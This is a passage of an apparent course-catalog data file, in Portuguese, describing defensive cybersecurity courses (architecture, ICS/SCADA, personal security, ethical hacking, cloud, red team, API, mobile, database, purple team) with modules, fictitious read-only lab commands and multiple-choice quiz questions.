        { moduleIndex: 2, title: "Achados que melhoram defesa", duration: "≈ 15 min", focus: "Comunicar confiança, lacunas e melhorias de detecção de forma acionável e responsável.", chapters: [{ time: "00:00", title: "Fato, inferência e confiança", summary: "Separe o que foi observado do que ainda é hipótese." }, { time: "05:00", title: "Detecção derivada", summary: "Transforme um aprendizado em uma regra que possa ser validada." }, { time: "11:00", title: "Retroalimentar o SOC", summary: "Registre o que mudou em playbooks, telemetria e métricas." }], transcript: [{ time: "00:00", text: "Um achado confiável descreve evidências, limites e o nível de confiança adotado; isso apoia decisões sem excesso de certeza." }, { time: "05:00", text: "Uma detecção derivada de hunting deve declarar o comportamento observado, os dados requeridos e o próximo passo de triagem." }, { time: "11:00", text: "A melhoria contínua transforma investigações em ajustes verificáveis de playbooks, telemetria e critérios de qualidade." }] },
      ],
    },
  },
  {
    slug: "security-architecture-threat-modeling", code: "ARCH-ADV-01", title: "Arquitetura de Segurança e Modelagem de Ameaças", shortTitle: "Arquitetura", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "purple", icon: "cpu",
    description: "Decisões de arquitetura, fronteiras de confiança, modelagem de ameaças e defesa em profundidade.", focus: "Construção de sistemas resilientes com linguagem de risco, controles e trade-offs.",
    outcomes: ["Representar ativos, fluxos e fronteiras de confiança em uma arquitetura.", "Transformar cenários de ameaça em controles proporcionais.", "Justificar decisões com segurança, disponibilidade e manutenção em vista."],
    modules: [
      { title: "Contexto e fronteiras", lessons: 5, description: "Ativos, fluxos de dados, componentes, dependências e limites de confiança." },
      { title: "Modelagem de ameaças", lessons: 5, description: "Cenários, abusos previsíveis, impacto, probabilidade e priorização de controles." },
      { title: "Arquitetura resiliente", lessons: 5, description: "Defesa em profundidade, identidade, segmentação, observabilidade e recuperação." },
    ],
    labsList: [
      { title: "Mapa de fronteiras", description: "Organize componentes de uma aplicação fictícia e suas fronteiras de confiança.", objective: "Identificar onde um fluxo exige autenticação, validação ou registro adicional.", command: "mapear-arquitetura --sistema portal-treino --fluxos usuarios,api,banco", output: "Fronteiras: 3\nDados sensíveis: autenticados\nPonto de validação: API\nAção: registrar controles propostos" },
      { title: "Plano de controles", description: "Priorize controles para um cenário de projeto simulado.", objective: "Relacionar ameaça, impacto e contramedida sem implementar ou testar sistemas reais.", command: "priorizar-controles --cenario app-treino --metodo risco", output: "Risco prioritário: acesso indevido\nControles: MFA, autorização e logs\nDependência: revisão de papéis\nStatus: plano documentado" },
    ],
    assessment: "Avaliação de fronteiras de confiança, modelagem de ameaças e decisões arquiteturais.",
    assessmentQuestions: [
      { id: "arch-1", prompt: "Uma fronteira de confiança marca:", options: ["Onde o nível de confiança e os controles precisam ser reavaliados", "Um backup automático", "Uma senha compartilhada", "Um log apagado"], correctAnswer: 0, explanation: "Mudanças de contexto entre componentes exigem validação e controles explícitos." },
      { id: "arch-2", prompt: "Modelagem de ameaças busca:", options: ["Antecipar abusos e priorizar controles", "Eliminar requisitos", "Executar ataques em produção", "Desativar monitoramento"], correctAnswer: 0, explanation: "O objetivo é reduzir risco no desenho e na evolução do sistema." },
      { id: "arch-3", prompt: "Defesa em profundidade combina:", options: ["Camadas de controles complementares", "Um único controle isolado", "Ausência de logs", "Acesso irrestrito"], correctAnswer: 0, explanation: "Camadas ajudam a reduzir o impacto quando um controle falha ou é contornado." },
      { id: "arch-4", prompt: "Um bom controle arquitetural deve ser:", options: ["Proporcional ao risco e sustentável na operação", "Sempre o mais complexo", "Oculto da equipe", "Independente de contexto"], correctAnswer: 0, explanation: "Controles efetivos precisam considerar ameaça, impacto, operação e manutenção." },
      { id: "arch-5", prompt: "Observabilidade na arquitetura apoia:", options: ["Detecção, investigação e melhoria contínua", "Apagar evidências", "Substituir testes", "Evitar revisão"], correctAnswer: 0, explanation: "Logs e métricas fornecem visibilidade para confirmar funcionamento e responder a desvios." },
    ],
  },
  {
    slug: "ics-scada-security", code: "ICS-ADV-01", title: "Segurança em ICS/SCADA", shortTitle: "ICS/SCADA", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "green", icon: "network",
    description: "Ativos industriais, segmentação, disponibilidade, monitoramento e resposta responsável em ambientes operacionais.", focus: "Proteção defensiva de sistemas ciberfísicos com segurança, confiabilidade e continuidade operacional.",
    outcomes: ["Diferenciar ambientes corporativos e operacionais sem simplificar seus riscos.", "Priorizar inventário, segmentação e mudanças controladas em cenários industriais.", "Planejar resposta com foco em segurança operacional e coordenação responsável."],
    modules: [
      { title: "Contexto operacional", lessons: 5, description: "Ativos industriais, processos físicos, disponibilidade, segurança e responsabilidades." },
      { title: "Segmentação e visibilidade", lessons: 5, description: "Zonas, conduítes, inventário passivo, acesso remoto e telemetria proporcional." },
      { title: "Mudanças e resposta", lessons: 5, description: "Gestão de mudanças, contingência, coordenação e preservação de operação segura." },
    ],
    labsList: [
      { title: "Inventário operacional", description: "Classifique ativos fictícios de uma planta de treinamento.", objective: "Reconhecer criticidade e responsáveis sem interagir com sistemas industriais reais.", command: "inventariar-ot --planta treinamento --modo passivo", output: "Ativos: 6\nCriticidade alta: controlador de processo\nAcesso remoto: restrito\nAção: registrar proprietário e zona" },
      { title: "Plano de segmentação OT", description: "Avalie uma separação de zonas para um cenário industrial fictício.", objective: "Reduzir caminhos desnecessários entre rede corporativa, DMZ e operação.", command: "revisar-segmentacao-ot --cenario energia-treino --somente-leitura", output: "Zona corporativa: separada\nDMZ industrial: presente\nAcesso de fornecedor: controlado\nStatus: plano para validação conjunta" },
    ],
    assessment: "Avaliação de contexto OT, segmentação, mudanças e resposta em ambientes ICS/SCADA.",
    assessmentQuestions: [
      { id: "ics-1", prompt: "Em ambientes ICS/SCADA, uma prioridade crítica é:", options: ["Segurança e continuidade operacional", "Testes não autorizados", "Mudanças sem registro", "Acesso público"], correctAnswer: 0, explanation: "Sistemas ciberfísicos exigem cuidado adicional com segurança de pessoas, processo e disponibilidade." },
      { id: "ics-2", prompt: "Inventário passivo é importante porque:", options: ["Ajuda a conhecer ativos com menor risco de interferência", "Substitui controles", "Permite mudar controladores", "Elimina necessidade de responsáveis"], correctAnswer: 0, explanation: "Visibilidade deve respeitar a sensibilidade e a estabilidade do ambiente operacional." },
      { id: "ics-3", prompt: "Uma DMZ industrial ajuda a:", options: ["Controlar comunicação entre TI e operação", "Criar acesso irrestrito", "Desativar logs", "Substituir segmentação"], correctAnswer: 0, explanation: "A zona intermediária pode reduzir exposição direta entre redes corporativas e operacionais." },
      { id: "ics-4", prompt: "Mudanças em um ambiente operacional devem:", options: ["Ser planejadas, aprovadas e coordenadas", "Ser feitas sem avisar", "Ignorar contingência", "Eliminar documentação"], correctAnswer: 0, explanation: "Gestão de mudanças reduz risco de impacto em processos físicos e serviços críticos." },
      { id: "ics-5", prompt: "Em uma ocorrência OT, a resposta deve envolver:", options: ["Equipes técnicas e responsáveis operacionais", "Somente uma pessoa sem contexto", "Publicação imediata de detalhes", "Exclusão de evidências"], correctAnswer: 0, explanation: "A coordenação entre segurança e operação é essencial para proteger processo, pessoas e ativos." },
    ],
  },
  {
    slug: "seguranca-pessoal-digital", code: "SEC-PES-01", title: "Segurança Pessoal Digital", shortTitle: "Segurança Pessoal", level: "Iniciante", duration: "12 horas", lessons: 12, labs: 2, quizCount: 5, accent: "cyan", icon: "shield",
    description: "Senhas, MFA, privacidade, dispositivos e reconhecimento de phishing para uma presença digital mais segura.", focus: "Hábitos de proteção que reduzem risco pessoal antes da entrada em ambientes técnicos.",
    outcomes: ["Criar uma estratégia prática de senhas únicas e MFA.", "Reconhecer sinais de phishing e engenharia social sem interagir com mensagens suspeitas.", "Configurar decisões de privacidade, atualização e recuperação de conta de modo consciente."],
    modules: [
      { title: "Sua identidade digital", lessons: 4, description: "Contas, senhas únicas, gerenciadores, MFA e métodos de recuperação." },
      { title: "Mensagens, golpes e privacidade", lessons: 4, description: "Sinais de phishing, urgência artificial, links, dados pessoais e exposição online." },
      { title: "Dispositivos e continuidade", lessons: 4, description: "Atualizações, bloqueio de tela, backup, recuperação e resposta inicial a uma suspeita." },
    ],
    labsList: [
      { title: "Auditoria de conta simulada", description: "Revise um perfil fictício para encontrar oportunidades de proteção.", objective: "Priorizar MFA, senha exclusiva e recuperação sem alterar contas reais.", command: "auditar-conta --perfil estudante-treino --somente-leitura", output: "MFA: pendente\nSenha exclusiva: recomendada\nRecuperação: contato alternativo ausente\nAção: registrar plano de fortalecimento" },
      { title: "Triagem de mensagem suspeita", description: "Classifique sinais presentes em um e-mail fictício.", objective: "Decidir a ação segura sem abrir links, anexos ou responder à mensagem.", command: "classificar-mensagem --amostra phishing-treino.eml --modo defensivo", output: "Sinais: urgência, domínio semelhante e link divergente\nClassificação: suspeita\nAção segura: reportar e excluir" },
    ],
    assessment: "Avaliação de identidade pessoal, privacidade, phishing e continuidade segura.",
    assessmentQuestions: [
      { id: "secpes-1", prompt: "Qual prática reduz o impacto do vazamento de uma senha?", options: ["Usar uma senha única para cada serviço", "Reutilizar a mesma senha", "Enviar a senha por mensagem", "Anotar a senha em local público"], correctAnswer: 0, explanation: "Senhas únicas evitam que um vazamento em um serviço abra acesso a outras contas." },
      { id: "secpes-2", prompt: "MFA adiciona principalmente:", options: ["Uma segunda evidência de acesso", "Uma cópia da senha", "Um antivírus", "Um backup automático"], correctAnswer: 0, explanation: "MFA combina fatores e dificulta o acesso indevido mesmo quando uma senha é exposta." },
      { id: "secpes-3", prompt: "Ao receber uma mensagem com urgência e link divergente, a postura adequada é:", options: ["Não interagir e reportar pelo canal oficial", "Clicar para confirmar", "Responder com dados pessoais", "Encaminhar sem aviso"], correctAnswer: 0, explanation: "Mensagens suspeitas devem ser verificadas por canais confiáveis, sem abrir links ou anexos." },
      { id: "secpes-4", prompt: "Atualizações de sistema ajudam a:", options: ["Corrigir falhas e manter proteções ativas", "Eliminar a necessidade de senha", "Substituir backups", "Desativar MFA"], correctAnswer: 0, explanation: "Atualizações corrigem vulnerabilidades conhecidas e preservam a proteção do dispositivo." },
      { id: "secpes-5", prompt: "Um contato de recuperação deve ser:", options: ["Confiável e protegido", "Desconhecido", "Público em redes sociais", "A mesma senha da conta"], correctAnswer: 0, explanation: "A recuperação é parte da segurança da conta e precisa de um canal confiável." },
    ],
  },
  {
    slug: "introducao-hacking-etico", code: "HACK-INTRO-01", title: "Introdução ao Hacking Ético", shortTitle: "Hacking Ético", level: "Iniciante", duration: "12 horas", lessons: 12, labs: 2, quizCount: 5, accent: "purple", icon: "terminal",
    description: "Ética, autorização, metodologia e comunicação responsável para compreender a carreira ofensiva sem sair do laboratório.", focus: "Consentimento, escopo, evidências e colaboração com a defesa em ambientes estritamente autorizados.",
    outcomes: ["Diferenciar pesquisa de segurança autorizada de atividade indevida.", "Explicar as etapas de uma avaliação segura sem praticar contra ativos reais.", "Registrar achados fictícios com evidência, impacto e recomendação responsável."],
    modules: [
      { title: "Ética e autorização", lessons: 4, description: "Escopo, regras de engajamento, confidencialidade, reporte e limites legais." },
      { title: "Metodologia com segurança", lessons: 4, description: "Reconhecimento autorizado, enumeração não destrutiva, validação controlada e evidências." },
      { title: "Carreira e comunicação", lessons: 4, description: "Bug bounty responsável, relatório, colaboração red-blue e desenvolvimento profissional." },
    ],
    labsList: [
      { title: "Carta de escopo", description: "Verifique os limites de um desafio fictício antes da atividade.", objective: "Confirmar ativos, janela, contato de emergência e ações proibidas em laboratório.", command: "revisar-escopo --missao treino-web-01 --autorizacao registrada", output: "Ambiente: isolado\nAtivos permitidos: 2\nAções proibidas: indisponibilização e coleta de dados reais\nStatus: apto para prática guiada" },
      { title: "Relato de observação", description: "Converta uma observação simulada em um achado responsável.", objective: "Descrever evidência, impacto potencial e recomendação sem divulgar detalhes sensíveis.", command: "registrar-achado --caso LAB-ETH-04 --classificacao treinamento", output: "Evidência: controle de sessão a revisar\nImpacto: acesso indevido potencial\nRecomendação: validação no servidor e teste de regressão\nStatus: pronto para revisão" },
    ],
    assessment: "Avaliação de ética, escopo, metodologia segura e comunicação de achados.",
    assessmentQuestions: [
      { id: "hackintro-1", prompt: "O requisito indispensável antes de testar um ativo é:", options: ["Autorização explícita e escopo definido", "Curiosidade técnica", "Uma ferramenta nova", "Acesso fora de horário"], correctAnswer: 0, explanation: "Autorização e escopo protegem as pessoas, os sistemas e a legitimidade da atividade." },
      { id: "hackintro-2", prompt: "Um ambiente de laboratório deve ser usado para:", options: ["Prática controlada sem impacto externo", "Testar organizações reais", "Coletar credenciais", "Remover registros"], correctAnswer: 0, explanation: "O laboratório isolado permite aprender com segurança e sem afetar terceiros." },
      { id: "hackintro-3", prompt: "Um relatório responsável inclui:", options: ["Evidência, impacto e recomendação", "Somente uma opinião", "Dados pessoais desnecessários", "Detalhes publicados sem revisão"], correctAnswer: 0, explanation: "Relatórios claros ajudam a organização a entender, priorizar e corrigir riscos." },
      { id: "hackintro-4", prompt: "Ao identificar algo fora do escopo, o profissional deve:", options: ["Parar e comunicar o responsável", "Continuar em segredo", "Publicar imediatamente", "Apagar a evidência"], correctAnswer: 0, explanation: "Atividades fora do escopo devem ser interrompidas e tratadas conforme as regras de engajamento." },
      { id: "hackintro-5", prompt: "A colaboração entre red team e blue team favorece:", options: ["Melhoria de controles e detecções", "Ocultação de achados", "Ausência de documentação", "Acesso irrestrito"], correctAnswer: 0, explanation: "A aprendizagem conjunta transforma simulações autorizadas em melhorias defensivas mensuráveis." },
    ],
  },
  {
    slug: "fundamentos-cloud-iniciante", code: "CLOUD-INIT-01", title: "Fundamentos de Cloud para Segurança", shortTitle: "Cloud Inicial", level: "Iniciante", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "blue", icon: "network",
    description: "Conceitos de nuvem, modelos de serviço, responsabilidade compartilhada e controles iniciais de identidade.", focus: "Vocabulário e decisões essenciais para estudar e operar cloud com responsabilidade desde o primeiro contato.",
    outcomes: ["Diferenciar IaaS, PaaS e SaaS em cenários de negócio.", "Explicar o modelo de responsabilidade compartilhada sem simplificações perigosas.", "Relacionar identidade, menor privilégio, registro e resiliência a boas práticas iniciais."],
    modules: [
      { title: "Como a nuvem funciona", lessons: 4, description: "Regiões, zonas, elasticidade, modelos de serviço e consumo sob demanda." },
      { title: "Responsabilidade e identidade", lessons: 4, description: "Divisão de responsabilidades, contas, funções, MFA e menor privilégio." },
      { title: "Visibilidade e resiliência", lessons: 4, description: "Logs, inventário, backups, configurações seguras e continuidade." },
    ],
    labsList: [
      { title: "Classificação de serviço cloud", description: "Associe necessidades de uma empresa simulada aos modelos de serviço.", objective: "Reconhecer o que é gerenciado pelo provedor e o que permanece sob responsabilidade do cliente.", command: "classificar-cloud --cenarios treinamento --modelo compartilhado", output: "Portal de e-mail: SaaS\nAmbiente de aplicação: PaaS\nMáquina virtual: IaaS\nAção: revisar responsabilidades por serviço" },
      { title: "Revisão de acesso inicial", description: "Analise uma função fictícia com permissões de teste.", objective: "Identificar acesso excessivo e propor MFA, função específica e registros de auditoria.", command: "revisar-iam --conta laboratorio-cloud --somente-leitura", output: "MFA: obrigatório\nPermissão excessiva: armazenamento global\nRecomendação: restringir por função\nLogs de auditoria: habilitar" },
    ],
    assessment: "Avaliação de modelos cloud, responsabilidade compartilhada, identidade e visibilidade.",
    assessmentQuestions: [
      { id: "cloudinit-1", prompt: "Em IaaS, o cliente normalmente é responsável por:", options: ["Configuração do sistema e das cargas de trabalho", "Construção física do datacenter", "Todas as operações do provedor", "Nada relacionado à segurança"], correctAnswer: 0, explanation: "A responsabilidade varia por serviço, mas em IaaS o cliente administra mais camadas do ambiente." },
      { id: "cloudinit-2", prompt: "O modelo de responsabilidade compartilhada significa que:", options: ["Provedor e cliente têm responsabilidades distintas", "O provedor assume tudo", "O cliente assume a infraestrutura física", "Não são necessários controles"], correctAnswer: 0, explanation: "As responsabilidades precisam ser entendidas por serviço e documentadas, não presumidas." },
      { id: "cloudinit-3", prompt: "Menor privilégio em cloud busca:", options: ["Conceder somente o acesso necessário", "Dar acesso administrador padrão", "Compartilhar contas", "Desativar auditoria"], correctAnswer: 0, explanation: "Permissões mínimas limitam o impacto de erro, abuso ou comprometimento." },
      { id: "cloudinit-4", prompt: "Logs de auditoria em cloud ajudam a:", options: ["Entender ações e investigar desvios", "Eliminar backups", "Substituir MFA", "Ocultar mudanças"], correctAnswer: 0, explanation: "Registros de auditoria fortalecem visibilidade, investigação e responsabilização." },
      { id: "cloudinit-5", prompt: "Um backup em cloud deve ser:", options: ["Planejado, protegido e testado", "Apenas declarado", "Público por padrão", "Guardado no mesmo ponto de falha"], correctAnswer: 0, explanation: "A continuidade depende de backups adequados e de testes periódicos de recuperação." },
    ],
  },
  {
    slug: "red-team-fundamentals", code: "RT-01", title: "Red Team Fundamentals", shortTitle: "Red Team", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "purple", icon: "terminal",
    description: "Reconhecimento autorizado, enumeração segura, validação controlada e relato para melhorar a postura defensiva.", focus: "Operações de simulação limitadas a cenários fictícios, com regras de engajamento e evidências revisáveis.",
    outcomes: ["Planejar uma simulação com objetivo, autorização e critérios de parada.", "Interpretar dados de inventário de laboratório sem tocar em ativos externos.", "Produzir recomendações defensivas que possam ser verificadas pela equipe responsável."],
    modules: [
      { title: "Planejamento de operação", lessons: 5, description: "Objetivos, escopo, regras de engajamento, comunicação e gestão de risco." },
      { title: "Descoberta em ambiente controlado", lessons: 5, description: "Reconhecimento, inventário fornecido, enumeração não destrutiva e organização de evidências." },
      { title: "Validação e reporte", lessons: 4, description: "Confirmação limitada, cadeia de evidências, impacto e recomendações para defesa." },
    ],
    labsList: [
      { title: "Plano de simulação", description: "Prepare uma operação fictícia com limites explícitos.", objective: "Registrar meta, ativos autorizados, janela e condição de parada antes de revisar o cenário.", command: "planejar-simulacao --cenario filial-treino --modo autorizado", output: "Objetivo: validar segmentação\nAtivos autorizados: 3\nJanela: 2 horas\nCondição de parada: impacto não previsto\nStatus: aguardando aprovação" },
      { title: "Inventário de laboratório", description: "Analise um inventário pré-coletado de uma rede fictícia.", objective: "Priorizar correções potenciais sem executar comandos contra a rede real.", command: "analisar-inventario --arquivo redteam-lab.json --somente-leitura", output: "Ativos inventariados: 5\nServiço a revisar: administração remota\nEvidência: configuração de treinamento\nAção: registrar recomendação de restrição" },
    ],
    assessment: "Avaliação de planejamento, coleta autorizada, validação controlada e relato responsável.",
    assessmentQuestions: [
      { id: "rt-1", prompt: "Uma simulação red team deve começar por:", options: ["Objetivo e regras de engajamento aprovados", "Acesso a qualquer ambiente", "Coleta de credenciais", "Desativação de logs"], correctAnswer: 0, explanation: "Objetivo, autorização e limites tornam a simulação legítima, segura e mensurável." },
      { id: "rt-2", prompt: "Dados de inventário em laboratório servem para:", options: ["Orientar análise dentro do escopo", "Acessar ativos externos", "Eliminar a documentação", "Ignorar responsáveis"], correctAnswer: 0, explanation: "Inventários fornecidos apoiam a avaliação sem exigir interação com ambientes fora do laboratório." },
      { id: "rt-3", prompt: "Uma condição de parada existe para:", options: ["Interromper a atividade diante de risco ou desvio", "Acelerar atividades fora do escopo", "Ocultar evidências", "Substituir aprovação"], correctAnswer: 0, explanation: "Condições de parada protegem disponibilidade, pessoas e a integridade da avaliação." },
      { id: "rt-4", prompt: "Uma evidência de qualidade deve ser:", options: ["Reproduzível e proporcional ao achado", "Baseada em rumor", "Não documentada", "Publicada sem revisão"], correctAnswer: 0, explanation: "Evidências claras permitem confirmar o risco e priorizar a correção de modo responsável." },
      { id: "rt-5", prompt: "O resultado esperado de uma simulação responsável é:", options: ["Melhoria concreta de controles e detecções", "Impacto em produção", "Exposição pública de falhas", "Ausência de relatório"], correctAnswer: 0, explanation: "O valor da simulação está em revelar oportunidades de proteção e apoiar sua correção." },
    ],
  },
  {
    slug: "api-security", code: "API-SEC-01", title: "API Security", shortTitle: "API Security", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Segurança de APIs REST, autenticação, autorização, validação e observabilidade com foco em design seguro.", focus: "Proteção de interfaces de serviço por controles no servidor, contratos claros e testes em cenários autorizados.",
    outcomes: ["Distinguir autenticação de autorização em uma API.", "Relacionar validação de entrada, limites e tratamento de erros a controles preventivos.", "Avaliar uma API fictícia segundo riscos recorrentes sem explorar ambientes reais."],
    modules: [
      { title: "Contratos e identidade", lessons: 5, description: "Recursos, métodos, autenticação, tokens, escopos e autorização por objeto." },
      { title: "Dados e resiliência", lessons: 5, description: "Validação no servidor, respostas de erro, limitação de taxa e proteção de segredos." },
      { title: "Visibilidade e revisão", lessons: 4, description: "Logs estruturados, auditoria, inventário de versões e revisão segura de endpoints." },
    ],
    labsList: [
      { title: "Revisão de endpoint", description: "Analise o contrato de uma API fictícia para identificar controles ausentes.", objective: "Relacionar função de usuário, recurso e validação de dados a uma regra no servidor.", command: "revisar-api --endpoint /contas/{id} --ambiente treino", output: "Autenticação: presente\nAutorização por objeto: pendente\nValidação de entrada: recomendada\nAção: incluir verificação no servidor" },
      { title: "Política de erros e logs", description: "Classifique uma resposta de erro simulada e seus registros.", objective: "Evitar exposição de detalhes internos mantendo rastreabilidade para investigação.", command: "validar-resposta-api --cenario erro-treino --modo seguro", output: "Cliente: mensagem genérica\nLog interno: identificador de correlação\nSegredo exposto: não\nResultado: padrão aprovado" },
    ],
    assessment: "Avaliação de controles de identidade, autorização, validação, erros e logs em APIs.",
    assessmentQuestions: [
      { id: "api-1", prompt: "Autorização em uma API determina:", options: ["Se a identidade pode acessar aquele recurso", "Se a rede está conectada", "O formato do log", "A versão do navegador"], correctAnswer: 0, explanation: "Após autenticar a identidade, a API precisa verificar se ela tem permissão para a ação e o objeto solicitado." },
      { id: "api-2", prompt: "Validação de entrada deve ocorrer principalmente:", options: ["No servidor, conforme o contrato esperado", "Apenas no cliente", "Somente após uma falha", "Nunca em APIs"], correctAnswer: 0, explanation: "O cliente não é uma fronteira confiável; regras críticas precisam ser validadas no servidor." },
      { id: "api-3", prompt: "Limitação de taxa ajuda a:", options: ["Reduzir abuso e preservar disponibilidade", "Substituir autenticação", "Aumentar privilégios", "Remover registros"], correctAnswer: 0, explanation: "Limites adequados reduzem tentativas excessivas e protegem a disponibilidade do serviço." },
      { id: "api-4", prompt: "Erros retornados ao cliente devem:", options: ["Ser úteis sem revelar detalhes internos", "Exibir segredos e rastros", "Sempre mostrar a pilha de execução", "Substituir logs"], correctAnswer: 0, explanation: "Detalhes técnicos são valiosos para investigação interna, mas podem criar exposição quando retornados ao cliente." },
      { id: "api-5", prompt: "Um inventário de APIs auxilia a:", options: ["Conhecer versões, responsáveis e superfícies expostas", "Dispensar revisão", "Eliminar autenticação", "Publicar endpoints sem controle"], correctAnswer: 0, explanation: "Inventário facilita governança, remoção de versões obsoletas e revisão de superfícies expostas." },
    ],
  },
  {
    slug: "mobile-security", code: "MOB-SEC-01", title: "Mobile Security", shortTitle: "Mobile Security", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "green", icon: "cpu",
    description: "Riscos e controles de aplicações Android e iOS, armazenamento, comunicação e privacidade por design.", focus: "Revisão segura de configurações e código fictício, sem coletar dados ou modificar dispositivos reais.",
    outcomes: ["Identificar superfícies de risco em aplicativos móveis.", "Aplicar princípios de armazenamento seguro, comunicação protegida e permissões mínimas.", "Usar checklist de revisão para uma aplicação móvel fictícia."],
    modules: [
      { title: "Ecossistema e ameaça", lessons: 5, description: "Modelo de permissões, ciclo de vida, distribuição, dependências e superfícies móveis." },
      { title: "Dados e comunicação", lessons: 5, description: "Armazenamento local, segredos, TLS, privacidade, notificações e compartilhamento." },
      { title: "Revisão e resposta", lessons: 4, description: "Configurações, dependências, telemetria, reporte responsável e correção contínua." },
    ],
    labsList: [
      { title: "Checklist de permissões", description: "Revise permissões solicitadas por um aplicativo de treinamento.", objective: "Relacionar cada permissão a uma finalidade e remover solicitações sem justificativa.", command: "revisar-permissoes --app academia-treino --somente-leitura", output: "Câmera: justificada\nLocalização precisa: não justificada\nArmazenamento seguro: pendente\nAção: aplicar menor privilégio" },
      { title: "Armazenamento e transporte", description: "Avalie uma configuração fictícia de dados móveis.", objective: "Identificar segredos em armazenamento impróprio e confirmar uso de comunicação protegida.", command: "validar-app-mobile --perfil seguro --ambiente laboratorio", output: "Segredos no código: não\nArmazenamento sensível: protegido\nCanal de comunicação: TLS\nResultado: ajustes documentados" },
    ],
    assessment: "Avaliação de permissões, dados, comunicação, privacidade e revisão de aplicações móveis.",
    assessmentQuestions: [
      { id: "mob-1", prompt: "Uma permissão móvel deve ser solicitada quando:", options: ["For necessária para uma finalidade clara", "O aplicativo quiser coletar mais dados", "Não houver explicação", "Sempre na instalação"], correctAnswer: 0, explanation: "Permissões proporcionais e justificadas reduzem a exposição de dados e respeitam a privacidade." },
      { id: "mob-2", prompt: "Segredos em um aplicativo móvel devem:", options: ["Ser evitados no código e gerenciados com segurança", "Ser incluídos no repositório", "Aparecer em logs", "Ser compartilhados em mensagens"], correctAnswer: 0, explanation: "Segredos expostos no aplicativo podem ser extraídos e reutilizados indevidamente." },
      { id: "mob-3", prompt: "TLS em uma aplicação móvel protege principalmente:", options: ["Dados em trânsito", "A cor da interface", "A bateria", "O tamanho do aplicativo"], correctAnswer: 0, explanation: "TLS reduz risco de exposição ou alteração de dados enquanto trafegam pela rede." },
      { id: "mob-4", prompt: "Privacidade por design significa:", options: ["Considerar proteção de dados desde o desenho", "Adicionar privacidade só após incidente", "Coletar tudo por padrão", "Ignorar consentimento"], correctAnswer: 0, explanation: "A proteção de dados é mais efetiva quando integrada às decisões de produto e engenharia." },
      { id: "mob-5", prompt: "Uma revisão de dependências ajuda a:", options: ["Identificar componentes desatualizados ou desnecessários", "Eliminar testes", "Substituir logs", "Dar privilégios extras"], correctAnswer: 0, explanation: "Componentes conhecidos, atualizados e necessários reduzem exposição na cadeia de software." },
    ],
  },
  {
    slug: "database-security", code: "DB-SEC-01", title: "Database Security", shortTitle: "Database Security", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "blue", icon: "shield",
    description: "Controle de acesso, proteção de dados, consultas parametrizadas, auditoria e continuidade para bancos de dados.", focus: "Decisões defensivas sobre dados em repouso e em uso, baseadas em ambientes e registros fictícios.",
    outcomes: ["Aplicar menor privilégio a papéis de acesso a dados.", "Explicar por que consultas parametrizadas e validação protegem aplicações.", "Relacionar criptografia, backup, auditoria e retenção à segurança de dados."],
    modules: [
      { title: "Dados, papéis e acesso", lessons: 5, description: "Classificação, contas de serviço, funções, segregação e revisão de privilégios." },
      { title: "Aplicações e consultas seguras", lessons: 5, description: "Parâmetros, validação, tratamento de erros e gestão de segredos de conexão." },
      { title: "Proteção e continuidade", lessons: 4, description: "Criptografia, backup, recuperação, logs de auditoria e retenção." },
    ],
    labsList: [
      { title: "Matriz de acesso a dados", description: "Compare papéis fictícios e as permissões necessárias para cada função.", objective: "Identificar privilégio excessivo sem executar mudanças em banco real.", command: "revisar-papeis-db --ambiente treinamento --somente-leitura", output: "Analista: leitura de relatórios\nServiço de aplicação: escrita limitada\nPrivilégio excessivo: exportação global\nAção: remover e revisar aprovação" },
      { title: "Revisão de consulta segura", description: "Avalie o padrão de acesso a dados de uma aplicação fictícia.", objective: "Diferenciar uso de parâmetros de concatenação de entradas e propor tratamento seguro de erros.", command: "revisar-consulta --projeto portal-treino --modo defensivo", output: "Parâmetros: presentes\nValidação: requerida por esquema\nErro ao cliente: genérico\nRegistro interno: identificador de correlação" },
    ],
    assessment: "Avaliação de acesso, consultas seguras, criptografia, backup e auditoria de bancos de dados.",
    assessmentQuestions: [
      { id: "db-1", prompt: "Menor privilégio em banco de dados busca:", options: ["Conceder somente as permissões necessárias", "Usar uma conta administradora para tudo", "Compartilhar credenciais", "Desativar auditoria"], correctAnswer: 0, explanation: "Funções específicas e permissões mínimas limitam o impacto de uma conta comprometida ou de um erro." },
      { id: "db-2", prompt: "Consultas parametrizadas ajudam a:", options: ["Separar dados de instruções da consulta", "Exibir segredos", "Desativar validação", "Substituir autorização"], correctAnswer: 0, explanation: "Parâmetros tratados pela biblioteca reduzem risco de manipulação indevida da estrutura da consulta." },
      { id: "db-3", prompt: "Criptografia em repouso protege principalmente:", options: ["Dados armazenados em mídia", "Apenas tráfego de rede", "A interface do aplicativo", "A retenção de logs"], correctAnswer: 0, explanation: "Ela reduz exposição quando arquivos, discos ou cópias de dados são acessados sem autorização." },
      { id: "db-4", prompt: "Um backup confiável deve:", options: ["Ser protegido e testado para recuperação", "Existir apenas no mesmo servidor", "Ser público", "Dispensar retenção"], correctAnswer: 0, explanation: "Backups só cumprem seu papel quando podem ser localizados, protegidos e recuperados dentro do prazo necessário." },
      { id: "db-5", prompt: "Logs de auditoria de banco apoiam:", options: ["Rastreabilidade e investigação", "Ausência de responsabilidades", "Acesso irrestrito", "Eliminação de controles"], correctAnswer: 0, explanation: "A auditoria registra ações relevantes e permite revisar mudanças, acessos e desvios." },
    ],
  },
  {
    slug: "purple-team-operations", code: "PURPLE-01", title: "Purple Team Operations", shortTitle: "Purple Team", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "green", icon: "network",
    description: "Colaboração entre simulação e defesa para testar controles, melhorar detecções e medir evolução com segurança.", focus: "Exercícios autorizados, objetivos observáveis, dados sintéticos e melhoria conjunta de prevenção e resposta.",
    outcomes: ["Definir cenários de colaboração entre equipes ofensivas e defensivas.", "Relacionar um comportamento simulado a telemetria e hipótese de detecção.", "Medir cobertura e registrar melhorias sem confundir exercício com incidente real."],
    modules: [
      { title: "Objetivos compartilhados", lessons: 5, description: "Escopo, segurança psicológica, cenários, papéis e critérios de sucesso." },
